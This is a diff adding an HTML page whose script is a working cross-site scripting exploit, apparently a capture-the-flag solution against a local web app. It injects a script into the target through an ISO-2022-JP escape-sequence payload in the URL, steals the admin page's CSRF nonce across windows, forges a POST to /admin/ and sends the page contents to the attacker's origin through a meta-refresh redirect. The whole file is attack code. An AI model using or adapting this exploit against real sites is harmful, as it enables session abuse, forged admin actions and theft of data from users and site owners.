@@ -1,0 +1,41 @@
+<html>
+    <body>
+        <script>
+            const TARGET = "http://web:8080"
+            const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+            // function that run in the xss iframe
+            async function iframe1func(){
+                const w = open("/\x61dmin/");
+                await sleep(1000)
+                const html = w.document.body.innerHTML;
+                const nonce = html.match(/<input type="hidden" name="nonce" value="([^"]+)">/)[1];
+                w.close();
+                window.onmessage = (e) => {
+                    const script = document.createElement('script')
+                    script.text = e.data;
+                    console.log(e.data)
+                    document.body.appendChild(script);
+                }
+                opener.postMessage(nonce, '*')
+            }
+            const xssIframe = open(TARGET + `/%1b$B%1b(B%3C/%1b(Btitle%3E<script>sleep=${encodeURIComponent(sleep)};(${encodeURIComponent(iframe1func)})()<\/script>`);
+
+            // onmessage event listener for the nonce
+            window.onmessage = (e) => {
+                async function csplessIframeFunc(){
+                    const w = open(TARGET);
+                    await sleep(1000);
+                    w.document.body.innerHTML = '<form method="post"><input type="hidden" name="nonce" value=""/>';
+                    w.document.forms[0].action = TARGET + '/admin/';
+                    w.document.querySelector('input').value = data;
+                    // make post request to the admin page
+                    w.document.forms[0].submit();
+                    await sleep(1000);
+                    // redirect to the attacker's origin with the flag
+                    w.document.body.innerHTML = '<meta http-equiv="refresh" content="0;url='+attackerOrigin+'?flag='+w.document.body.innerText+'">';
+                }
+                xssIframe.postMessage(`attackerOrigin="${location.origin}";sleep=${sleep};TARGET='${TARGET}';data='${e.data}';(${csplessIframeFunc})()`, '*');
+            }
+        </script>
+    </body>
+</html>
